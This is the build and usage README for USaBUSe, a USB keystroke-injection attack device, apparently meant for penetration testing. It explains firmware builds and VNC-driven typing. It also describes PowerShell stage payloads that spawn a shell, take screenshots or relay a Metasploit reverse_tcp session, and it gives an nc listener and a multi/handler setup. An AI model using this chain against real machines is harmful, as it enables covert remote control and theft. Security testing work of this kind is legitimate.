Instructions for building the Universal Serial aBuse firmwares and host software

Start off by performing a recursive clone of the repository:

```
$ git clone --recursive https://github.com/sensepost/USaBUSe
```

This can take some time, please be patient!

Building the ESP8266 firmware
=============================

Once the recursive clone has completed, build the esp-open-sdk (make sure to
build the STANDALONE version!):

```
  $ cd esp-open-sdk
  $ make STANDALONE=n
```

Note: This step MUST be done on a case-sensitive file system! For OS X, create
an extra volume, make sure to select a case-sensitive file system, and do the
above clone --recursive in this file system.

Once the esp-open-sdk has compiled, in the top-level directory, do:

```
  $ wget --content-disposition "http://bbs.espressif.com/download/file.php?id=1046"
  $ unzip ESP8266_NONOS_SDK_V1.5.1_16_01_08.zip
```

If you are on OS X, you will probably need to install GNU sed, and make sure it
is in your PATH. An easy way of doing this is to use HomeBrew:

```
  $ brew install gnu-sed
  $ export PATH="/usr/local/opt/gnu-sed/libexec/gnubin:$PATH"
```

Alternatively, to ensure that it remains accessible after you log out, and to
avoid strange errors on future builds, add it to your bash profile.

If you run into this, be sure to run "make clean" to remove any broken artifacts,
before trying to build again.

At this stage, you should be able to change to the esp-vnc directory, and run
make to build the ESP8266 firmware.

```
  $ cd esp-vnc
  $ make
```

NOTE: It is expected to get errors regarding incorrect parameters passed to stat
on OS X. This is part of the original esp-link makefile, and has not been
corrected. It does not affect the final firmware build, it is just a check to
make sure that the firmware is not too big.

This should result in a user1.bin file in the esp-vnc/firmware directory.

Building the AVR firmware
=========================

OS X can also get the AVR compiler by installing the Arduino app, e.g. Caskroom/cask/arduino

Linux can install using apt-get:

```
  $ sudo apt-get install gcc-avr avr-libc avrdude
```

Once the avr tools are installed, and avr-gcc is in your PATH, compile the avr firmwares:

```
  $ cd avr
  $ make
```

This should build two firmwares, Program_ESP and KeyboardMouseGeneric. i.e you should have .hex files in each directory.

Programming the firmwares
=========================

```
  $ esp-vnc/flash_esp esp-vnc/firmware/user1.bin avr/KeyboardMouseGeneric/KeyboardMouseGeneric.hex
```

Note: The flash_esp and flash_avr shell scripts contain a pattern which usually
manages to identify the serial port that the AVR appears at. If you have other
USB Serial interfaces connected, you may want to either unplug them, or update
the pattern to exclude the incorrect ports.

Interacting with the device
===========================

To send keystrokes and mouse movements to the device, use a VNC client. The
password is hard coded to "password".

To do this in an automated way, the vncdo tool is very useful. It is referenced
as a submodule, to install it:

```
  $ cd vncdotool
  $ python setup.py
```

Note, vncdotool is only compatible with Python2.7, not python 3+

```
  $ vncdo -s esp-link.lan -p password type "echo hello" key enter
```

A more comprehensive example might be:

```
  $ vncdo -s esp-link.lan -p password key alt-r pause 1 type powershell key enter pause 1 typefile powershell/read_exec.ps1
```

If esp-link.lan does not resolve, look for port 23 and 5900 on the local network,
or check your DHCP server.

Interacting with the Generic HID interface requires the victim-side code found
under the powershell/ directory, as well as the attacker-side code found in
stage.sh. A demonstration of a complete, end-to-end attack can be found in
attack.sh

In summary, the way it works is for the attacker to use VNC to type out a stage0
payload (currently using powershell), which has just enough smarts to open the
higher-bandwidth channel (currently only Generic HID is implemented), and load
and execute a more complicated stage1 payload. There are a couple of stage1
payloads implemented currently:

* spawn.ps1 - Run cmd.exe, and pipe stdout/stderr over the device, while reading
  from the device, and writing that to stdin of the process.
* screenshot.ps1 - take a screenshot of the desktop, and send it over the device.
* msf_proxy.ps1 - Open a TCP socket on localhost:65535, and relay data back and
  forth over the device. In a separate thread, invoke the metasploit stage
  loader, connecting to localhost:65535. This can be used to run a msfconsole
  windows/shell/reverse_tcp or even (with some patience!) a full
  windows/meterpreter/reverse_tcp.

Patience is required because the USB device does not have particularly high
bandwidth. Generic HID is limited to 64KB/s, and the UART between the two
microprocessors is limited to 250kbps (25KBps), but other limitations (many
likely due to naive implementation!) limit us even further! Currently, we are
achieving approximately 4KBps.

Patches to improve the speed (and any other aspect of the system) are welcome!

Once the basic stage0 payload has been typed out via VNC, the second stage is
sent via the Generic HID interface (only implementation currently).

read_exec.ps1 expects to receive the next stage in the following format:

```
<stage length high byte><stage length low byte><powershell stage>
```

The included stage.sh shell script takes care of this process for you.

Note! There is an important sleep included between sending the second stage, and
connecting the socket to the final endpoint (msf, etc). The reason for this is
that the second stage may not finish on a 63-byte boundary, and if the final
endpoint starts sending data prematurely, some of that data may end up "packed"
into the empty space in the last packet of the stage2 payload. Currently, the
stage0 loader has no mechanism to keep this data aside for later use by the
second stage, and it gets discarded. Introducing a sleep ensures that any data
from the final endpoint does not get packed in with the stage2 payload, and
avoids data corruption.

Using Metasploit Framework
==========================

The current attack.sh script expects to connect to a listener running on port 4444
on localhost. Exactly what sort of listener that should be depends on the stage1
script that was sent. If you send spawn.ps1, the listener can be a simple
"nc -l -p 4444". If you are sending msf_proxy.ps1, the listener should be an
appropriately configured msfconsole. You can choose your payload as you like,
from the group of payloads that make use of a staged/reverse_tcp connection.

For example:
```
./msfconsole
use exploit/multi/handler
set payload windows/shell/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit
```

NB: Do NOT set LHOST to 127.0.0.1, this is an internal "magic number" used by
metasploit for its own purposes. Things randomly break if you do!